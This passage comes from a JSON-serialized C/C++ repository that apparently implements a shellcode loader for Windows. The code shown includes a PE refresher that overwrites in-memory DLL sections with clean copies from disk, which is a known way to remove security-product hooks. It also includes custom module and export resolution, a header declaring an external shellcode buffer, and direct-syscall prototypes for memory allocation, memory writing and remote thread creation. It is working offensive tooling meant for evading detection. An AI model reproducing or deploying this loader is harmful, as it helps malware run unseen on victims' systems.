next_import;\n\n                    memcpy(wszDllName, wsRedir, stRedirName * sizeof(WCHAR));\n                }\n            }\n\n            // Load the module\n            hModule = CustomGetModuleHandleW(wszDllName);\n\n            // Ignore libraries that fail to load\n            if (hModule == NULL)\n                goto next_import;\n\n            if (pImportDesc->OriginalFirstThunk)\n                pThunkData = (PIMAGE_THUNK_DATA)(pLibraryAddr + pImportDesc->OriginalFirstThunk);\n            else\n                pThunkData = (PIMAGE_THUNK_DATA)(pLibraryAddr + pImportDesc->FirstThunk);\n\n            pIatEntry = (FARPROC*)(pLibraryAddr + pImportDesc->FirstThunk);\n\n            // loop through each thunk and resolve the import\n            for(; DEREF(pThunkData); pThunkData++, pIatEntry++)\n            {\n                if (IMAGE_SNAP_BY_ORDINAL(pThunkData->u1.Ordinal))\n                    *pIatEntry = CustomGetProcAddressEx(hModule, (PCHAR)IMAGE_ORDINAL(pThunkData->u1.Ordinal), wszDllName);\n                else\n                    *pIatEntry = CustomGetProcAddressEx(hModule, ((PIMAGE_IMPORT_BY_NAME)(pLibraryAddr + DEREF(pThunkData)))->Name, wszDllName);\n            }\n\nnext_import:\n            if (wszDllName != NULL)\n            {\n                free(wszDllName);\n                wszDllName = NULL;\n            }\n            pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PCHAR)pImportDesc + sizeof(IMAGE_IMPORT_DESCRIPTOR));\n\n        }\n    }\n\ncleanup:\n    if (pFile != NULL)\n        UnmapViewOfFile(pFile);\n    if (hMap != NULL)\n        CloseHandle(hMap);\n    if (hFile != INVALID_HANDLE_VALUE)\n        CloseHandle(hFile);\n\n    return (HMODULE) pLibraryAddr;\n}\n\nHMODULE CustomGetModuleHandleW(const PWSTR wszModule)\n{\n    // HMODULE hModule = NULL;\n    __PLDR_DATA_TABLE_ENTRY pLdteHead = NULL;\n    __PLDR_DATA_TABLE_ENTRY pLdteCurrent = NULL;\n\n    OUTPUTDBGA(\"\\t\\t\\t[*] Searching for loaded module: \");\n    OUTPUTDBGW(wszModule);\n    OUTPUTDBGA(\" -> \");\n\n    pLdteCurrent = pLdteHead = GetInMemoryOrderModuleList();\n\n    do {\n        if (pLdteCurrent->FullDllName.Length > 2 &&\n            _wcsnicmp(wszModule, pLdteCurrent->BaseDllName.Buffer, pLdteCurrent->BaseDllName.Length / 2) == 0)\n        {\n            OUTPUTDBGA(\"found in memory\\n\");\n            return ((HMODULE)pLdteCurrent->DllBase);\n        }\n        pLdteCurrent = (__PLDR_DATA_TABLE_ENTRY)pLdteCurrent->InMemoryOrderModuleList.Flink;\n    } while (pLdteCurrent != pLdteHead);\n\n    OUTPUTDBGA(\"loading from disk\\n\");\n    return LoadLibraryW(wszModule);\n}\n\nVOID ScanAndFixModule(PCHAR pKnown, PCHAR pSuspect, PWCHAR wszBaseDllName)\n{\n    // PE headers\n    PIMAGE_DOS_HEADER pDosHeader;\n    PIMAGE_NT_HEADERS pNtHeader;\n    PIMAGE_SECTION_HEADER pSectionHeader;\n\n    DWORD dwIdx;\n\n    OUTPUTDBGA(\"[*] Scanning module: \");\n    OUTPUTDBGW(wszBaseDllName);\n    OUTPUTDBGA(\"\\n\");\n\n    pDosHeader = (PIMAGE_DOS_HEADER)pKnown;\n    pNtHeader = (PIMAGE_NT_HEADERS)(pKnown + pDosHeader->e_lfanew);\n\n    // Scan PE header\n    ScanAndFixSection(\"Header\", pKnown, pSuspect, pNtHeader->OptionalHeader.SizeOfHeaders);\n\n    // Scan each section\n    pSectionHeader = (PIMAGE_SECTION_HEADER)(pKnown + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));\n    for (dwIdx = 0; dwIdx < pNtHeader->FileHeader.NumberOfSections; dwIdx++)\n    {\n\n        // Skip writable sections\n        if (pSectionHeader[dwIdx].Characteristics & IMAGE_SCN_MEM_WRITE)\n            continue;\n\n        ScanAndFixSection((PCHAR)pSectionHeader[dwIdx].Name, pKnown + pSectionHeader[dwIdx].VirtualAddress,\n                          pSuspect + pSectionHeader[dwIdx].VirtualAddress, pSectionHeader[dwIdx].Misc.VirtualSize);\n    }\n}\n\nVOID ScanAndFixSection(PCHAR szSectionName, PCHAR pKnown, PCHAR pSuspect, size_t stLength)\n{\n    DWORD ddOldProtect;\n\n    if (memcmp(pKnown, pSuspect, stLength) != 0)\n    {\n        OUTPUTDBGA(\"\\t[!] Found modification in: \");\n        OUTPUTDBGA(szSectionName);\n        OUTPUTDBGA(\"\\n\");\n\n        if (!VirtualProtect(pSuspect, stLength, PAGE_EXECUTE_READWRITE, &ddOldProtect))\n            return;\n\n        OUTPUTDBGA(\"\\t[+] Copying known good section into memory.\\n\");\n        memcpy(pSuspect, pKnown, stLength);\n\n        if (!VirtualProtect(pSuspect, stLength, ddOldProtect, &ddOldProtect))\n            OUTPUTDBGA(\"\\t[!] Failed to reset memory permissions.\\n\");\n    }\n}\n\n\n// This code is modified from Stephen Fewer's GetProcAddress implementation\n//===============================================================================================//\n// Copyright (c) 2013, Stephen Fewer of Harmony Security (www.harmonysecurity.com)\n// All rights reserved.\n// \n// Redistribution and use in source and binary forms, with or without modification, are permitted \n// provided that the following conditions are met:\n// \n//     * Redistributions of source code must retain the above copyright notice, this list of \n// conditions and the following disclaimer.\n// \n//     * Redistributions in binary form must reproduce the above copyright notice, this list of \n// conditions and the following disclaimer in the documentation and/or other materials provided \n// with the distribution.\n// \n//     * Neither the name of Harmony Security nor the names of its contributors may be used to\n// endorse or promote products derived from this software without specific prior written permission.\n// \n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR \n// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND\n// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR \n// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR \n// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY \n// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR \n// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n// POSSIBILITY OF SUCH DAMAGE.\n//===============================================================================================//\nFARPROC WINAPI CustomGetProcAddressEx(HMODULE hModule, const PCHAR lpProcName, PWSTR wszOriginalModule)\n{\n    UINT_PTR uiLibraryAddress = 0;\n    UINT_PTR uiAddressArray = 0;\n    UINT_PTR uiNameArray = 0;\n    UINT_PTR uiNameOrdinals = 0;\n    UINT_PTR uiFuncVA = 0;\n    PCHAR cpExportedFunctionName;\n    PCHAR szFwdDesc;\n    PCHAR szRedirFunc;\n    PWSTR wszDllName;\n    SIZE_T stDllName;\n    PWCHAR wsRedir;\n    //PWSTR wszRedirName = NULL;\n    SIZE_T stRedirName;\n\n    HMODULE hFwdModule;\n    PIMAGE_NT_HEADERS pNtHeaders = NULL;\n    PIMAGE_DATA_DIRECTORY pDataDirectory = NULL;\n    PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;\n    FARPROC fpResult = NULL;\n    DWORD dwCounter;\n\n    if (hModule == NULL)\n        return NULL;\n\n    // a module handle is really its base address\n    uiLibraryAddress = (UINT_PTR)hModule;\n\n    // get the VA of the modules NT Header\n    pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);\n\n    pDataDirectory = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];\n\n    // get the VA of the export directory\n    pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiLibraryAddress + pDataDirectory->VirtualAddress);\n\n    // get the VA for the array of addresses\n    uiAddressArray = (uiLibraryAddress + pExportDirectory->AddressOfFunctions);\n\n    // get the VA for the array of name pointers\n    uiNameArray = (uiLibraryAddress + pExportDirectory->AddressOfNames);\n\n    // get the VA for the array of name ordinals\n    uiNameOrdinals = (uiLibraryAddress + pExportDirectory->AddressOfNameOrdinals);\n\n    // test if we are importing by name or by ordinal...\n    // #pragma warning(suppress: 4311)\n    if (((DWORD)lpProcName & 0xFFFF0000) == 0x00000000)\n    {\n        // import by ordinal...\n\n        // use the import ordinal (- export ordinal base) as an index into the array of addresses\n        // #pragma warning(suppress: 4311)\n        uiAddressArray += ((IMAGE_ORDINAL((DWORD)lpProcName) - pExportDirectory->Base) * sizeof(DWORD));\n\n        // resolve the address for this imported function\n        fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));\n    }\n    else\n    {\n        // import by name...\n        dwCounter = pExportDirectory->NumberOfNames;\n        while (dwCounter--)\n        {\n            cpExportedFunctionName = (PCHAR)(uiLibraryAddress + DEREF_32(uiNameArray));\n\n            // test if we have a match...\n            if (strcmp(cpExportedFunctionName, lpProcName) == 0)\n            {\n                // use the functions name ordinal as an index into the array of name pointers\n                uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));\n                uiFuncVA = DEREF_32(uiAddressArray);\n\n                // check for redirected exports\n                if (pDataDirectory->VirtualAddress <= uiFuncVA && uiFuncVA < (pDataDirectory->VirtualAddress + pDataDirectory->Size))\n                {\n                    szFwdDesc = (PCHAR)(uiLibraryAddress + uiFuncVA);\n\n                    OUTPUTDBGA(\"\\t\\t\\t[*] Found a redirected entry: \");\n                    OUTPUTDBGA(szFwdDesc);\n                    OUTPUTDBGA(\"\\n\");\n\n                    // Find the first character after \".\"\n                    szRedirFunc = strstr(szFwdDesc, \".\") + 1;\n                    stDllName = (SIZE_T)(szRedirFunc - szFwdDesc);\n\n                    // Allocate enough space to append \"dll\"\n                    wszDllName = (PWSTR)calloc(stDllName + 3 + 1, sizeof(WCHAR));\n                    if (wszDllName == NULL)\n                        break;\n\n                    mbstowcs_s(NULL, wszDllName, stDllName + 1, szFwdDesc, stDllName);\n                    memcpy(wszDllName + stDllName, L\"dll\", 3 * sizeof(WCHAR));\n\n                    // check for a redirected module name\n                    if (_wcsnicmp(wszDllName, L\"api-\", 4) == 0 || _wcsnicmp(wszDllName, L\"ext-\", 4) == 0)\n                    {\n                        wsRedir = GetRedirectedName(wszOriginalModule, wszDllName, &stRedirName);\n                        if (wsRedir)\n                        {\n                            // Free the original buffer and allocate a new one for the redirected dll name\n                            free(wszDllName);\n\n                            wszDllName = (PWSTR)calloc(stRedirName + 1, sizeof(WCHAR));\n                            if (wszDllName == NULL)\n                                break;\n\n                            memcpy(wszDllName, wsRedir, stRedirName * sizeof(WCHAR));\n                        }\n                    }\n\n                    hFwdModule = GetModuleHandleW(wszDllName);\n                    fpResult = CustomGetProcAddressEx(hFwdModule, szRedirFunc, wszDllName);\n                    free(wszDllName);\n                }\n                else\n                {\n                    // calculate the virtual address for the function\n                    fpResult = (FARPROC)(uiLibraryAddress + uiFuncVA);\n                }\n\n                // finish...\n                break;\n            }\n\n            // get the next exported function name\n            uiNameArray += sizeof(DWORD);\n\n            // get the next exported function name ordinal\n            uiNameOrdinals += sizeof(WORD);\n        }\n    }\n\n    return fpResult;\n}\n"
        },
        {
          "name": "loader.h",
          "type": "blob",
          "size": 0.7138671875,
          "content": "#pragma once\n\n#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n//#include <winternl.h>\n#include <stdlib.h>\n#include \"ApiSetMap.h\"\n\n#ifdef _DEBUG_\n#define OUTPUTDBGA(str) puts(str);\n#define OUTPUTDBGW(str) _putws(str);\n#else\n#define OUTPUTDBGA(str)\n#define OUTPUTDBGW(str)\n#endif\n\nvoid RefreshPE();\nHMODULE CustomLoadLibrary(const PWCHAR wszFullDllName, const PWCHAR wszBaseDllName, ULONG_PTR pDllBase);\nHMODULE CustomGetModuleHandleW(const PWSTR wszModule);\nFARPROC WINAPI CustomGetProcAddressEx(HMODULE hModule, const PCHAR lpProcName, PWSTR wszOriginalModule);\nVOID ScanAndFixModule(PCHAR pKnown, PCHAR pSuspect, PWCHAR wszBaseDllName);\nVOID ScanAndFixSection(PCHAR szSectionName, PCHAR pKnown, PCHAR pSuspect, size_t stLength);\n"
        },
        {
          "name": "shellcode.hpp",
          "type": "blob",
          "size": 0.056640625,
          "content": "extern unsigned char buf[];\nextern unsigned int buf_size;\n"
        },
        {
          "name": "sleep.hpp",
          "type": "blob",
          "size": 0.0302734375,
          "content": "extern unsigned int sleep_time;"
        },
        {
          "name": "syscalls.hpp",
          "type": "blob",
          "size": 17.2177734375,
          "content": "#ifndef _SYSCALLS_HPP_\n#define _SYSCALLS_HPP_\n#include <windows.h>\n#ifdef _DEBUG_\n#include <iostream>\n#endif\n#include <winternl.h>\n\n// Version\n#define PHNT_WIN2K 50\n#define PHNT_WINXP 51\n#define PHNT_WS03 52\n#define PHNT_VISTA 60\n#define PHNT_WIN7 61\n#define PHNT_WIN8 62\n#define PHNT_WINBLUE 63\n#define PHNT_THRESHOLD 100\n#define PHNT_THRESHOLD2 101\n#define PHNT_REDSTONE 102\n#define PHNT_REDSTONE2 103\n#define PHNT_REDSTONE3 104\n#define PHNT_REDSTONE4 105\n#define PHNT_REDSTONE5 106\n#define PHNT_19H1 107\n#define PHNT_19H2 108\n\n// #define PHNT_VERSION PHNT_WINXP     // Windows XP\n// #define PHNT_VERSION PHNT_WS03      // Windows Server 2003\n#define PHNT_VERSION PHNT_VISTA     // Windows Vista\n// #define PHNT_VERSION PHNT_WIN7      // Windows 7\n// #define PHNT_VERSION PHNT_WIN8      // Windows 8\n// #define PHNT_VERSION PHNT_WINBLUE   // Windows 8.1\n// #define PHNT_VERSION PHNT_THRESHOLD // Windows 10\n\n//#define PHNT_MODE PHNT_MODE_KERNEL\n//typedef UNICODE_STRING *PUNICODE_STRING;\n\n//#include \"phnt/phnt_windows.h\"\n//#include \"phnt/phnt.h\"\n//#include \"phnt/ntpsapi.h\"\n//#include \"phnt/phnt_ntdef.h\"\n// typedef struct _UNICODE_STRING\n// {\n//     USHORT Length;\n//     USHORT MaximumLength;\n//     _Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;\n// } UNICODE_STRING, *PUNICODE_STRING;\n\ntypedef struct _INITIAL_TEB\n{\n    struct\n    {\n        PVOID OldStackBase;\n        PVOID OldStackLimit;\n    } OldInitialTeb;\n    PVOID StackBase;\n    PVOID StackLimit;\n    PVOID StackAllocationBase;\n} INITIAL_TEB, *PINITIAL_TEB;\n\n// typedef struct _OBJECT_ATTRIBUTES\n// {\n//     ULONG Length;\n//     HANDLE RootDirectory;\n//     PUNICODE_STRING ObjectName;\n//     ULONG Attributes;\n//     PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;\n//     PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE\n// } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;\n\ntypedef struct _PS_ATTRIBUTE\n{\n    ULONG_PTR Attribute;\n    SIZE_T Size;\n    union {\n        ULONG_PTR Value;\n        PVOID ValuePtr;\n    };\n    PSIZE_T ReturnLength;\n} PS_ATTRIBUTE, *PPS_ATTRIBUTE;\n\ntypedef struct _PS_ATTRIBUTE_LIST\n{\n    SIZE_T TotalLength;\n    PS_ATTRIBUTE Attributes[1];\n} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;\n\n// typedef struct _CLIENT_ID\n// {\n//     HANDLE UniqueProcess;\n//     HANDLE UniqueThread;\n// } CLIENT_ID, *PCLIENT_ID;\n\n// windows-internals-book:\"Chapter 5\"\ntypedef enum _PS_CREATE_STATE\n{\n    PsCreateInitialState,\n    PsCreateFailOnFileOpen,\n    PsCreateFailOnSectionCreate,\n    PsCreateFailExeFormat,\n    PsCreateFailMachineMismatch,\n    PsCreateFailExeName, // Debugger specified\n    PsCreateSuccess,\n    PsCreateMaximumStates\n} PS_CREATE_STATE;\n\ntypedef struct _PS_CREATE_INFO\n{\n    SIZE_T Size;\n    PS_CREATE_STATE State;\n    union\n    {\n        // PsCreateInitialState\n        struct\n        {\n            union\n            {\n                ULONG InitFlags;\n                struct\n                {\n                    UCHAR WriteOutputOnExit : 1;\n                    UCHAR DetectManifest : 1;\n                    UCHAR IFEOSkipDebugger : 1;\n                    UCHAR IFEODoNotPropagateKeyState : 1;\n                    UCHAR SpareBits1 : 4;\n                    UCHAR SpareBits2 : 8;\n                    USHORT ProhibitedImageCharacteristics : 16;\n                };\n            };\n            ACCESS_MASK AdditionalFileAccess;\n        } InitState;\n\n        // PsCreateFailOnSectionCreate\n        struct\n        {\n            HANDLE FileHandle;\n        } FailSection;\n\n        // PsCreateFailExeFormat\n        struct\n        {\n            USHORT DllCharacteristics;\n        } ExeFormat;\n\n        // PsCreateFailExeName\n        struct\n        {\n            HANDLE IFEOKey;\n        } ExeName;\n\n        // PsCreateSuccess\n        struct\n        {\n            union\n            {\n                ULONG OutputFlags;\n                struct\n                {\n                    UCHAR ProtectedProcess : 1;\n                    UCHAR AddressSpaceOverride : 1;\n                    UCHAR DevOverrideEnabled : 1; // from Image File Execution Options\n                    UCHAR ManifestDetected : 1;\n                    UCHAR ProtectedProcessLight : 1;\n                    UCHAR SpareBits1 : 3;\n                    UCHAR SpareBits2 : 8;\n                    USHORT SpareBits3 : 16;\n                };\n            };\n            HANDLE FileHandle;\n            HANDLE SectionHandle;\n            ULONGLONG UserProcessParametersNative;\n            ULONG UserProcessParametersWow64;\n            ULONG CurrentParameterFlags;\n            ULONGLONG PebAddressNative;\n            ULONG PebAddressWow64;\n            ULONGLONG ManifestAddress;\n            ULONG ManifestSize;\n        } SuccessState;\n    };\n} PS_CREATE_INFO, *PPS_CREATE_INFO;\n\n// I'd recommend https://github.com/processhacker/phnt for these definitions\n// NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);\n\nNTSTATUS NtCreateFile(\n    _Out_ PHANDLE FileHandle,\n    _In_ ACCESS_MASK DesiredAccess,\n    _In_ POBJECT_ATTRIBUTES ObjectAttributes,\n    _Out_ PIO_STATUS_BLOCK IoStatusBlock,\n    _In_opt_ PLARGE_INTEGER AllocationSize,\n    _In_ ULONG FileAttributes,\n    _In_ ULONG ShareAccess,\n    _In_ ULONG CreateDisposition,\n    _In_ ULONG CreateOptions,\n    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,\n    _In_ ULONG EaLength);\n\nNTSTATUS NtAllocateVirtualMemory(\n    _In_ HANDLE ProcessHandle,\n    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID *BaseAddress,\n    _In_ ULONG_PTR ZeroBits,\n    _Inout_ PSIZE_T RegionSize,\n    _In_ ULONG AllocationType,\n    _In_ ULONG Protect);\n\nNTSTATUS NtProtectVirtualMemory(\n    _In_ HANDLE ProcessHandle,\n    _Inout_ PVOID *BaseAddress,\n    _Inout_ PSIZE_T RegionSize,\n    _In_ ULONG NewProtect,\n    _Out_ PULONG OldProtect);\n\nNTSTATUS NtReadVirtualMemory(\n    _In_ HANDLE ProcessHandle,\n    _In_opt_ PVOID BaseAddress,\n    _Out_writes_bytes_(BufferSize) PVOID Buffer,\n    _In_ SIZE_T BufferSize,\n    _Out_opt_ PSIZE_T NumberOfBytesRead);\n\nNTSTATUS NtWriteVirtualMemory(\n    _In_ HANDLE ProcessHandle,\n    _In_opt_ PVOID BaseAddress,\n    _In_reads_bytes_(BufferSize) PVOID Buffer,\n    _In_ SIZE_T BufferSize,\n    _Out_opt_ PSIZE_T NumberOfBytesWritten);\n\nNTSTATUS NtCreateThread(\n    _Out_ PHANDLE ThreadHandle,\n    _In_ ACCESS_MASK DesiredAccess,\n    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,\n    _In_ HANDLE ProcessHandle,\n    _Out_ PCLIENT_ID ClientId,\n    _In_ PCONTEXT ThreadContext,\n    _In_ PINITIAL_TEB InitialTeb,\n    _In_ BOOLEAN CreateSuspended);\n\n#if (PHNT_VERSION >= PHNT_VISTA)\nNTSTATUS NtCreateThreadEx(\n    _Out_ PHANDLE ThreadHandle,\n    _In_ ACCESS_MASK DesiredAccess,\n    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,\n    _In_ HANDLE ProcessHandle,\n    _In_ PVOID StartRoutine, // PUSER_THREAD_START_ROUTINE\n    _In_opt_ PVOID Argument,\n    _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*\n    _In_ SIZE_T ZeroBits,\n    _In_ SIZE_T StackSize,\n    _In_ SIZE_T MaximumStackSize,\n    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList);\n#endif\n\n#if (PHNT_VERSION >= PHNT_VISTA)\nNTSTATUS NtCreateUserProcess(\n    _Out_ PHANDLE ProcessHandle,\n    _Out_ PHANDLE ThreadHandle,\n    _In_ ACCESS_MASK ProcessDesiredAccess,\n    _In_ ACCESS_MASK ThreadDesiredAccess,\n    _In_opt_ POBJECT_ATTRIBUTES ProcessObjectAttributes,\n    _In_opt_ POBJECT_ATTRIBUTES ThreadObjectAttributes,\n    _In_ ULONG ProcessFlags, // PROCESS_CREATE_FLAGS_*\n    _In_ ULONG ThreadFlags, // THREAD_CREATE_FLAGS_*\n    _In_opt_ PVOID ProcessParameters, // PRTL_USER_PROCESS_PARAMETERS\n    _Inout_ PPS_CREATE_INFO CreateInfo,\n    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList\n    );\n#endif\n\ntypedef enum _PS_PROTECTED_TYPE\n{\n    PsProtectedTypeNone,\n    PsProtectedTypeProtectedLight,\n    PsProtectedTypeProtected,\n    PsProtectedTypeMax\n} PS_PROTECTED_TYPE;\n\ntypedef enum _PS_PROTECTED_SIGNER\n{\n    PsProtectedSignerNone,\n    PsProtectedSignerAuthenticode,\n    PsProtectedSignerCodeGen,\n    PsProtectedSignerAntimalware,\n    PsProtectedSignerLsa,\n    PsProtectedSignerWindows,\n    PsProtectedSignerWinTcb,\n    PsProtectedSignerWinSystem,\n    PsProtectedSignerApp,\n    PsProtectedSignerMax\n} PS_PROTECTED_SIGNER;\n\n#define PS_PROTECTED_SIGNER_MASK 0xFF\n#define PS_PROTECTED_AUDIT_MASK 0x08\n#define PS_PROTECTED_TYPE_MASK 0x07\n\ntypedef struct _PS_PROTECTION\n{\n    union\n    {\n        UCHAR Level;\n        struct\n        {\n            UCHAR Type : 3;\n            UCHAR Audit : 1;\n            UCHAR Signer : 4;\n        };\n    };\n} PS_PROTECTION, *PPS_PROTECTION;\n\n#define PROCESS_CREATE_FLAGS_BREAKAWAY 0x00000001\n#define PROCESS_CREATE_FLAGS_NO_DEBUG_INHERIT 0x00000002\n#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004\n#define PROCESS_CREATE_FLAGS_OVERRIDE_ADDRESS_SPACE 0x00000008\n#define PROCESS_CREATE_FLAGS_LARGE_PAGES 0x00000010\n#define PROCESS_CREATE_FLAGS_LARGE_PAGE_SYSTEM_DLL 0x00000020\n// Extended PROCESS_CREATE_FLAGS_*\n#define PROCESS_CREATE_FLAGS_PROTECTED_PROCESS 0x00000040\n#define PROCESS_CREATE_FLAGS_CREATE_SESSION 0x00000080 // ?\n#define PROCESS_CREATE_FLAGS_INHERIT_FROM_PARENT 0x00000100\n#define PROCESS_CREATE_FLAGS_SUSPENDED 0x00000200\n#define PROCESS_CREATE_FLAGS_EXTENDED_UNKNOWN 0x00000400\n\n#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001\n#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH 0x00000002 // ?\n#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER 0x00000004\n#define THREAD_CREATE_FLAGS_HAS_SECURITY_DESCRIPTOR 0x00000010 // ?\n#define THREAD_CREATE_FLAGS_ACCESS_CHECK_IN_TARGET 0x00000020 // ?\n#define THREAD_CREATE_FLAGS_INITIAL_THREAD 0x00000080\n\ntypedef struct _CURDIR\n{\n    UNICODE_STRING DosPath;\n    HANDLE Handle;\n} CURDIR, *PCURDIR;\n\ntypedef struct _RTL_DRIVE_LETTER_CURDIR\n{\n    USHORT Flags;\n    USHORT Length;\n    ULONG TimeStamp;\n    STRING DosPath;\n} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;\n\ntypedef enum _PS_ATTRIBUTE_NUM\n{\n    PsAttributeParentProcess, // in HANDLE\n    PsAttributeDebugPort, // in HANDLE\n    PsAttributeToken, // in HANDLE\n    PsAttributeClientId, // out PCLIENT_ID\n    PsAttributeTebAddress, // out PTEB *\n    PsAttributeImageName, // in PWSTR\n    PsAttributeImageInfo, // out PSECTION_IMAGE_INFORMATION\n    PsAttributeMemoryReserve, // in PPS_MEMORY_RESERVE\n    PsAttributePriorityClass, // in UCHAR\n    PsAttributeErrorMode, // in ULONG\n    PsAttributeStdHandleInfo, // 10, in PPS_STD_HANDLE_INFO\n    PsAttributeHandleList, // in PHANDLE\n    PsAttributeGroupAffinity, // in PGROUP_AFFINITY\n    PsAttributePreferredNode, // in PUSHORT\n    PsAttributeIdealProcessor, // in PPROCESSOR_NUMBER\n    PsAttributeUmsThread, // ? in PUMS_CREATE_THREAD_ATTRIBUTES\n    PsAttributeMitigationOptions, // in UCHAR\n    PsAttributeProtectionLevel, // in ULONG\n    PsAttributeSecureProcess, // since THRESHOLD\n    PsAttributeJobList,\n    PsAttributeChildProcessPolicy, // since THRESHOLD2\n    PsAttributeAllApplicationPackagesPolicy, // since REDSTONE\n    PsAttributeWin32kFilter,\n    PsAttributeSafeOpenPromptOriginClaim,\n    PsAttributeBnoIsolation, // PS_BNO_ISOLATION_PARAMETERS\n    PsAttributeDesktopAppPolicy, // in ULONG\n    PsAttributeChpe, // since REDSTONE3\n    PsAttributeMax\n} PS_ATTRIBUTE_NUM;\n\n#define PS_ATTRIBUTE_NUMBER_MASK 0x0000ffff\n#define PS_ATTRIBUTE_THREAD 0x00010000 // may be used with thread creation\n#define PS_ATTRIBUTE_INPUT 0x00020000 // input only\n#define PS_ATTRIBUTE_ADDITIVE 0x00040000 // \"accumulated\" e.g. bitmasks, counters, etc.\n\n#define PsAttributeValue(Number, Thread, Input, Additive) \\\n    (((Number) & PS_ATTRIBUTE_NUMBER_MASK) | \\\n    ((Thread) ? PS_ATTRIBUTE_THREAD : 0) | \\\n    ((Input) ? PS_ATTRIBUTE_INPUT : 0) | \\\n    ((Additive) ? PS_ATTRIBUTE_ADDITIVE : 0))\n\n#define PS_ATTRIBUTE_PARENT_PROCESS \\\n    PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE)\n#define PS_ATTRIBUTE_DEBUG_PORT \\\n    PsAttributeValue(PsAttributeDebugPort, FALSE, TRUE, TRUE)\n#define PS_ATTRIBUTE_TOKEN \\\n    PsAttributeValue(PsAttributeToken, FALSE, TRUE, TRUE)\n#define PS_ATTRIBUTE_CLIENT_ID \\\n    PsAttributeValue(PsAttributeClientId, TRUE, FALSE, FALSE)\n#define PS_ATTRIBUTE_TEB_ADDRESS \\\n    PsAttributeValue(PsAttributeTebAddress, TRUE, FALSE, FALSE)\n#define PS_ATTRIBUTE_IMAGE_NAME \\\n    PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_IMAGE_INFO \\\n    PsAttributeValue(PsAttributeImageInfo, FALSE, FALSE, FALSE)\n#define PS_ATTRIBUTE_MEMORY_RESERVE \\\n    PsAttributeValue(PsAttributeMemoryReserve, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_PRIORITY_CLASS \\\n    PsAttributeValue(PsAttributePriorityClass, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_ERROR_MODE \\\n    PsAttributeValue(PsAttributeErrorMode, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_STD_HANDLE_INFO \\\n    PsAttributeValue(PsAttributeStdHandleInfo, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_HANDLE_LIST \\\n    PsAttributeValue(PsAttributeHandleList, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_GROUP_AFFINITY \\\n    PsAttributeValue(PsAttributeGroupAffinity, TRUE, TRUE, FALSE)\n#define PS_ATTRIBUTE_PREFERRED_NODE \\\n    PsAttributeValue(PsAttributePreferredNode, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_IDEAL_PROCESSOR \\\n    PsAttributeValue(PsAttributeIdealProcessor, TRUE, TRUE, FALSE)\n#define PS_ATTRIBUTE_UMS_THREAD \\\n    PsAttributeValue(PsAttributeUmsThread, TRUE, TRUE, FALSE)\n#define PS_ATTRIBUTE_MITIGATION_OPTIONS \\\n    PsAttributeValue(PsAttributeMitigationOptions, FALSE, TRUE, TRUE)\n#define PS_ATTRIBUTE_PROTECTION_LEVEL \\\n    PsAttributeValue(PsAttributeProtectionLevel, FALSE, TRUE, TRUE)\n#define PS_ATTRIBUTE_SECURE_PROCESS \\\n    PsAttributeValue(PsAttributeSecureProcess, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_JOB_LIST \\\n    PsAttributeValue(PsAttributeJobList, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_CHILD_PROCESS_POLICY \\\n    